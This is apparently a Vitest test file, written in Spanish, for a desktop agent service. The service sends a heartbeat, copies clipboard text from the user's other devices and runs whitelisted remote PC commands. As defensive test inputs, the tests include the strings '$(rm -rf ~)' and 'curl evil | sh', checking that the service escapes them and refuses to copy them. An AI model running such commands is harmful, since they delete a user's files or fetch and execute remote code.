// servicio.ts sin red: un cliente de Supabase falso, credenciales y config
// falsas y el escritorio espiado. Comprueba el latido de cada minuto con las
// apps de config.json, la reacción a un INSERT del Puente y que se para
// cuando lo desvinculan (42501 o credenciales que ya no valen).
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

const m = vi.hoisted(() => ({
  credenciales: null as unknown,
  config: { supabaseUrl: 'https://abc.supabase.co', apps: [] as { nombre: string; orden: string[] }[], macRouter: null },
  cliente: null as unknown,
  errorConectar: null as Error | null,
  errorConfig: null as Error | null,
  copiar: vi.fn(async (_t: string) => true),
  notificar: vi.fn(async (_t: string, _c: string) => {}),
}))

vi.mock('./archivos.ts', () => ({
  cargarCredenciales: async () => m.credenciales,
  cargarConfig: async () => {
    if (m.errorConfig) throw m.errorConfig
    return m.config
  },
}))
vi.mock('./conexion.ts', () => {
  class Desvinculado extends Error {}
  return {
    Desvinculado,
    conectar: async () => {
      if (m.errorConectar) throw m.errorConectar
      return m.cliente
    },
  }
})
vi.mock('./escritorio.ts', () => ({ copiar: m.copiar, notificar: m.notificar }))
// El Mando del PC se prueba aparte (mando.test.ts): aquí, sin volumen ni sesión
const mando = vi.hoisted(() => ({ ejecutar: vi.fn((_o: unknown) => {}), fallo: null as Error | null }))
// ejecutar es una función normal que apunta la llamada y, si toca, falla
// (un vi.fn que rechaza deja una promesa sin capturar dentro del propio espía)
vi.mock('./mando.ts', () => ({
  ejecutar: async (o: unknown) => {
    mando.ejecutar(o)
    if (mando.fallo) throw mando.fallo
  },
  sesionGrafica: async () => null,
  volumenActual: async () => null,
}))

const { iniciarServicio, VERSION } = await import('./servicio.ts')
const { Desvinculado } = await import('./conexion.ts')

const DUENO = 'aaaaaaaa-0000-4000-8000-00000000000a'
const AGENTE = '99999999-0000-4000-8000-000000000009'

type AlCambio = (cambio: { new: Record<string, unknown> }) => void

function clienteFalso(opciones: { fila?: { user_id: string; nombre: string } | null; errorFila?: unknown } = {}) {
  const f = {
    rpc: vi.fn(async (_n: string, _a: unknown) => ({ data: null, error: null as null | { code?: string; message: string } })),
    /** Llamadas que no son el latido (las del Mando del PC). */
    rpcMando: vi.fn(async (_n: string, _a?: unknown) => ({ data: [] as unknown, error: null })),
    on: vi.fn(),
    alCambio: null as AlCambio | null,
    filtro: null as unknown,
    alComando: null as AlCambio | null,
    canalNombre: '',
    eq: vi.fn(),
    from: vi.fn(),
    removeChannel: vi.fn(async () => 'ok'),
    signOut: vi.fn(async () => ({ error: null })),
  }
  // Un canal por nombre: el del Puente («agente-…») es el que miran estos tests
  const nuevoCanal = (nombre: string) => {
    const canal = {
      on: (_tipo: string, filtro: unknown, cb: AlCambio) => {
        if (nombre.startsWith('mando-')) f.alComando = cb
        if (nombre.startsWith('agente-')) {
          f.filtro = filtro
          f.alCambio = cb
          f.on(_tipo, filtro)
        }
        return canal
      },
      subscribe: (cb?: (estado: string) => void) => {
        cb?.('SUBSCRIBED')
        return canal
      },
    }
    return canal
  }
  const cliente = {
    from: (tabla: string) => {
      f.from(tabla)
      return {
        select: () => ({
          eq: (col: string, val: string) => {
            f.eq(col, val)
            return { maybeSingle: async () => ({ data: opciones.fila === undefined ? { user_id: DUENO, nombre: 'PC casa' } : opciones.fila, error: opciones.errorFila ?? null }) }
          },
        }),
      }
    },
    rpc: (n: string, a?: unknown) => (n === 'agente_latido' ? f.rpc(n, a) : f.rpcMando(n, a)),
    channel: (nombre: string) => {
      if (nombre.startsWith('agente-')) f.canalNombre = nombre
      return nuevoCanal(nombre)
    },
    removeChannel: f.removeChannel,
    auth: { signOut: f.signOut },
  }
  return { f, cliente }
}

/** process.exit falso: apunta el código y no sale. */
let salidas: (number | undefined)[]
let manejadores: Map<string, () => void>

beforeEach(() => {
  vi.useFakeTimers()
  salidas = []
  manejadores = new Map()
  vi.spyOn(process, 'exit').mockImplementation(((codigo?: number) => {
    salidas.push(codigo)
    return undefined as never
  }) as typeof process.exit)
  // Que no se queden enganchados SIGTERM/SIGINT de verdad en el proceso de los tests
  vi.spyOn(process, 'on').mockImplementation(((evento: string, fn: () => void) => {
    manejadores.set(evento, fn)
    return process
  }) as typeof process.on)
  vi.spyOn(console, 'log').mockImplementation(() => {})
  vi.spyOn(console, 'warn').mockImplementation(() => {})
  vi.spyOn(console, 'error').mockImplementation(() => {})
  m.credenciales = { supabaseUrl: 'https://abc.supabase.co', anonKey: 'k', email: 'agente-1@agente.invalid', password: 'x'.repeat(43), agenteId: AGENTE, nombre: 'PC casa' }
  m.config = { supabaseUrl: 'https://abc.supabase.co', apps: [{ nombre: 'Firefox', orden: ['firefox'] }, { nombre: 'Steam', orden: ['steam', '-silent'] }], macRouter: null }
  m.errorConectar = null
  m.errorConfig = null
  m.copiar.mockClear()
  m.notificar.mockClear()
})

afterEach(() => {
  vi.useRealTimers()
  vi.restoreAllMocks()
})

async function arrancar(f: ReturnType<typeof clienteFalso>) {
  m.cliente = f.cliente
  await iniciarServicio()
  return f.f
}

const esperar = () => vi.advanceTimersByTimeAsync(0)

describe('latido', () => {
  it('late al arrancar y cada minuto con los NOMBRES de las apps de config (nunca sus órdenes)', async () => {
    const f = await arrancar(clienteFalso())
    expect(f.rpc).toHaveBeenCalledTimes(1)
    expect(f.rpc).toHaveBeenLastCalledWith('agente_latido', { apps: ['Firefox', 'Steam'], version: VERSION, volumen: null, silenciado: null })
    await vi.advanceTimersByTimeAsync(59_999)
    expect(f.rpc).toHaveBeenCalledTimes(1)
    await vi.advanceTimersByTimeAsync(1)
    expect(f.rpc).toHaveBeenCalledTimes(2)
    await vi.advanceTimersByTimeAsync(60_000 * 3)
    expect(f.rpc).toHaveBeenCalledTimes(5)
    expect(JSON.stringify(f.rpc.mock.calls)).not.toContain('-silent')
    expect(f.rpc.mock.calls.every(([n]) => n === 'agente_latido')).toBe(true)
    expect(salidas).toEqual([])
  })

  it('sin apps en config: latido con lista vacía', async () => {
    m.config = { ...m.config, apps: [] }
    const f = await arrancar(clienteFalso())
    expect(f.rpc).toHaveBeenLastCalledWith('agente_latido', { apps: [], version: VERSION, volumen: null, silenciado: null })
  })

  it('pregunta por SU fila (la del agente de las credenciales)', async () => {
    const f = await arrancar(clienteFalso())
    expect(f.from).toHaveBeenCalledWith('agentes')
    expect(f.eq).toHaveBeenCalledWith('id', AGENTE)
  })

  it('un fallo de red en el latido no lo para: sigue latiendo', async () => {
    const { f, cliente } = clienteFalso()
    f.rpc.mockResolvedValueOnce({ data: null, error: { code: '', message: 'fetch failed' } })
    await arrancar({ f, cliente })
    await vi.advanceTimersByTimeAsync(60_000)
    expect(f.rpc).toHaveBeenCalledTimes(2)
    expect(salidas).toEqual([])
    expect(m.notificar).not.toHaveBeenCalled()
  })

  it('42501 (desvinculado desde la app): avisa y se para con código 0', async () => {
    const { f, cliente } = clienteFalso()
    await arrancar({ f, cliente })
    f.rpc.mockResolvedValueOnce({ data: null, error: { code: '42501', message: 'No es un agente vinculado' } })
    await vi.advanceTimersByTimeAsync(60_000)
    expect(salidas).toEqual([0])
    expect(m.notificar).toHaveBeenCalledTimes(1)
    expect(m.notificar.mock.calls[0][1]).toMatch(/desvinculado/i)
  })

  it('42501 ya en el primer latido: se para', async () => {
    const { f, cliente } = clienteFalso()
    f.rpc.mockResolvedValueOnce({ data: null, error: { code: '42501', message: 'x' } })
    await arrancar({ f, cliente })
    expect(salidas).toEqual([0])
  })
})

describe('Puente en tiempo real', () => {
  it('escucha solo los INSERT del Puente de su dueño', async () => {
    const f = await arrancar(clienteFalso())
    expect(f.filtro).toEqual({ event: 'INSERT', schema: 'public', table: 'puente', filter: `user_id=eq.${DUENO}` })
    expect(f.canalNombre).toBe(`agente-${AGENTE}`)
  })

  it('un texto de otro dispositivo: lo copia TAL CUAL y avisa (escapado), primero copia', async () => {
    const f = await arrancar(clienteFalso())
    const texto = '$(rm -rf ~); <b>hola</b>'
    f.alCambio!({ new: { id: 'p1', user_id: DUENO, tipo: 'texto', contenido: texto, archivo_nombre: null, dispositivo: 'Móvil' } })
    await esperar()
    expect(m.copiar).toHaveBeenCalledWith(texto)
    expect(m.notificar).toHaveBeenCalledTimes(1)
    const [titulo, cuerpo] = m.notificar.mock.calls[0]
    expect(titulo).toBe('Puente · Móvil')
    expect(cuerpo).toContain('&lt;b&gt;hola&lt;/b&gt;')
    expect(m.copiar.mock.invocationCallOrder[0]).toBeLessThan(m.notificar.mock.invocationCallOrder[0])
  })

  it('lo que manda este mismo PC (mismo nombre) ni se copia ni se avisa', async () => {
    const f = await arrancar(clienteFalso({ fila: { user_id: DUENO, nombre: 'Sobremesa' } }))
    f.alCambio!({ new: { id: 'p2', tipo: 'texto', contenido: 'desde aquí', archivo_nombre: null, dispositivo: 'Sobremesa' } })
    await esperar()
    expect(m.copiar).not.toHaveBeenCalled()
    expect(m.notificar).not.toHaveBeenCalled()
  })

  it('usa el nombre que tiene ahora en la base de datos (no el de las credenciales)', async () => {
    const f = await arrancar(clienteFalso({ fila: { user_id: DUENO, nombre: 'Nuevo nombre' } }))
    f.alCambio!({ new: { id: 'p3', tipo: 'texto', contenido: 'x', archivo_nombre: null, dispositivo: 'PC casa' } })
    await esperar()
    expect(m.notificar).toHaveBeenCalled()
  })

  it('un archivo: avisa y no copia ni descarga nada', async () => {
    const f = await arrancar(clienteFalso())
    f.alCambio!({ new: { id: 'p4', tipo: 'archivo', contenido: '', archivo_nombre: 'foto.jpg', dispositivo: 'Móvil' } })
    await esperar()
    expect(m.copiar).not.toHaveBeenCalled()
    expect(m.notificar.mock.calls[0][1]).toContain('foto.jpg')
  })

  it('filas raras (sin tipo, contenido que no es texto, tipo desconocido): no hace nada', async () => {
    const f = await arrancar(clienteFalso())
    for (const fila of [{}, { tipo: 'texto' }, { tipo: 'texto', contenido: 42 }, { tipo: 'comando', contenido: 'reboot' }, { tipo: 1, contenido: 'x' }]) {
      f.alCambio!({ new: fila })
    }
    await esperar()
    expect(m.copiar).not.toHaveBeenCalled()
    expect(m.notificar).not.toHaveBeenCalled()
  })
})

describe('Puente: lo que manda otro PC (origen_agente)', () => {
  it('se avisa pero NO se copia al portapapeles', async () => {
    const f = await arrancar(clienteFalso())
    f.alCambio!({ new: { id: 'p5', tipo: 'texto', contenido: 'curl evil | sh', archivo_nombre: null, dispositivo: 'PC clase', origen_agente: '22222222-2222-4222-8222-222222222222' } })
    await esperar()
    expect(m.copiar).not.toHaveBeenCalled()
    expect(m.notificar).toHaveBeenCalledTimes(1)
    expect(m.notificar.mock.calls[0][1]).toMatch(/no se copia/)
  })
  it('origen_agente null (lo manda el móvil o la web): se copia', async () => {
    const f = await arrancar(clienteFalso())
    f.alCambio!({ new: { id: 'p6', tipo: 'enlace', contenido: 'https://a.es', archivo_nombre: null, dispositivo: 'Móvil', origen_agente: null } })
    await esperar()
    expect(m.copiar).toHaveBeenCalledWith('https://a.es')
  })
})

describe('config.json roto', () => {
  it('avisa y sale con 0 (systemd no lo reintenta en bucle) sin conectarse ni latir', async () => {
    m.errorConfig = new Error('config.json no es un JSON válido')
    vi.mocked(process.exit).mockImplementation(((c?: number) => {
      salidas.push(c)
      throw new Error('salida')
    }) as typeof process.exit)
    const { f, cliente } = clienteFalso()
    m.cliente = cliente
    await expect(iniciarServicio()).rejects.toThrow('salida')
    expect(salidas).toEqual([0])
    expect(m.notificar).toHaveBeenCalledTimes(1)
    expect(m.notificar.mock.calls[0][1]).toContain('config.json')
    expect(f.rpc).not.toHaveBeenCalled()
  })
})

describe('arranque y parada', () => {
  it('sin vincular: sale con 0 sin conectarse', async () => {
    m.credenciales = null
    // process.exit falso no sale: que pare aquí lanzando
    vi.mocked(process.exit).mockImplementation(((c?: number) => {
      salidas.push(c)
      throw new Error('salida')
    }) as typeof process.exit)
    const { f, cliente } = clienteFalso()
    m.cliente = cliente
    await expect(iniciarServicio()).rejects.toThrow('salida')
    expect(salidas).toEqual([0])
    expect(f.rpc).not.toHaveBeenCalled()
  })

  it('credenciales que ya no valen (Desvinculado): avisa y sale con 0', async () => {
    m.errorConectar = new Desvinculado('Este PC ya no está vinculado.')
    vi.mocked(process.exit).mockImplementation(((c?: number) => {
      salidas.push(c)
      throw new Error('salida')
    }) as typeof process.exit)
    await expect(iniciarServicio()).rejects.toThrow('salida')
    expect(salidas).toEqual([0])
    expect(m.notificar).toHaveBeenCalledTimes(1)
  })

  it('sin red al conectar: lanza (systemd lo reintenta) y no sale con 0', async () => {
    m.errorConectar = new Error('fetch failed')
    await expect(iniciarServicio()).rejects.toThrow('fetch failed')
    expect(salidas).toEqual([])
  })

  it('su fila ya no existe: sale con 0 sin latir', async () => {
    vi.mocked(process.exit).mockImplementation(((c?: number) => {
      salidas.push(c)
      throw new Error('salida')
    }) as typeof process.exit)
    const { f, cliente } = clienteFalso({ fila: null })
    m.cliente = cliente
    await expect(iniciarServicio()).rejects.toThrow('salida')
    expect(salidas).toEqual([0])
    expect(f.rpc).not.toHaveBeenCalled()
  })

  it('SIGTERM: deja de latir, quita el canal, cierra sesión y sale con 0', async () => {
    const f = await arrancar(clienteFalso())
    expect(manejadores.has('SIGTERM')).toBe(true)
    manejadores.get('SIGTERM')!()
    await esperar()
    expect(f.removeChannel).toHaveBeenCalled()
    expect(f.signOut).toHaveBeenCalled()
    expect(salidas).toEqual([0])
    const antes = f.rpc.mock.calls.length
    await vi.advanceTimersByTimeAsync(5 * 60_000)
    expect(f.rpc.mock.calls.length).toBe(antes)
  })
})

describe('Mando del PC', () => {
  beforeEach(() => {
    mando.ejecutar.mockReset()
    mando.fallo = null
  })

  function conOrden(accion: string, valor: string | null) {
    const c = clienteFalso()
    c.f.rpcMando.mockImplementation(async (n: string) => ({
      data: n === 'agente_tomar_comando' ? [{ accion, valor }] : [],
      error: null,
    }))
    return c
  }

  it('coge la orden, la ejecuta (lista fija) y cuenta que ha ido bien', async () => {
    const f = await arrancar(conOrden('volumen', '40'))
    f.alComando?.({ new: { id: 'c1' } })
    await esperar()
    await esperar()
    expect(f.rpcMando).toHaveBeenCalledWith('agente_tomar_comando', { comando: 'c1' })
    expect(mando.ejecutar).toHaveBeenCalledWith({ programa: 'wpctl', args: ['set-volume', '@DEFAULT_AUDIO_SINK@', '40%'] })
    expect(f.rpcMando).toHaveBeenCalledWith('agente_resultado', { comando: 'c1', ok: true, mensaje: null })
  })

  it('si el servidor no se la da (caducada o ya cogida), no hace nada', async () => {
    const c = clienteFalso()
    c.f.rpcMando.mockImplementation(async () => ({ data: [], error: null }))
    const f = await arrancar(c)
    f.alComando?.({ new: { id: 'c1' } })
    await esperar()
    expect(mando.ejecutar).not.toHaveBeenCalled()
    expect(f.rpcMando).not.toHaveBeenCalledWith('agente_resultado', expect.anything())
  })

  it('apagar: cuenta el resultado ANTES de ejecutar', async () => {
    const orden: string[] = []
    const c = conOrden('apagar', null)
    const tomar = c.f.rpcMando.getMockImplementation()!
    c.f.rpcMando.mockImplementation(async (n: string, a?: unknown) => {
      if (n === 'agente_resultado') orden.push('resultado')
      return tomar(n, a)
    })
    mando.ejecutar.mockImplementation(() => {
      orden.push('ejecutar')
    })
    const f = await arrancar(c)
    f.alComando?.({ new: { id: 'c2' } })
    await esperar()
    await esperar()
    expect(orden).toEqual(['resultado', 'ejecutar'])
  })

  it('una app que no está en config.json no se abre (y se cuenta como error)', async () => {
    const f = await arrancar(conOrden('abrir_app', 'bash'))
    f.alComando?.({ new: { id: 'c3' } })
    await esperar()
    await esperar()
    expect(mando.ejecutar).not.toHaveBeenCalled()
    expect(f.rpcMando).toHaveBeenCalledWith('agente_resultado', { comando: 'c3', ok: false, mensaje: 'Esta acción no está permitida en este PC' })
  })

  it('si falla, cuenta el error sin rutas personales', async () => {
    mando.fallo = Object.assign(new Error('falla en /home/alguien/x'), { code: 'ENOENT' })
    const f = await arrancar(conOrden('play_pausa', null))
    f.alComando?.({ new: { id: 'c4' } })
    for (let i = 0; i < 5; i++) await esperar()
    expect(f.rpcMando).toHaveBeenCalledWith('agente_resultado', { comando: 'c4', ok: false, mensaje: 'Falta un programa en el PC (mira docs/AGENTE.md)' })
  })
})
